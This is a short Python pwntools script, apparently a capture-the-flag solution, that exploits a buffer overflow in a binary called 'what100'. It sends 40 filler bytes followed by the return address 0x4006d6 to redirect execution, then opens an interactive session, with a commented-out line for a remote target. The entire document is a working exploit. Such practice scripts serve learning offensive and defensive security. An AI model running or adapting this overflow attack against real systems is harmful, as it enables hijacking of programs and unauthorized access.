from pwn import *

r = process('./what100')
#r = remote('127.0.0.1', 1234)

go = 0x4006d6
print 'A'*40 + p64(go)
r.recvuntil('go? ')
r.sendline('A'*40 + p64(go))
r.interactive()
